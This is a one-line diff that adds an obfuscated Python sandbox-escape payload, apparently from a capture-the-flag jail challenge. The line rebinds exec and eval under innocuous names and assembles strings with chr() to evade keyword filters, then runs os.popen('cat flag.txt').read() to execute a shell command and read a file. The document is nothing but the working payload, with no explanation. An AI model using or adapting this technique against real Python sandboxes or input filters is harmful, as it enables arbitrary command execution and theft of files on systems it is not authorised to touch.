@@ -1,0 +1,1 @@
+(help:= exec, help("import o" + "s"), tuple:= eval, w:= chr(46), tuple("o" + "s" + w + "popen('cat flag" + w + "txt')"+w+ "read()"))
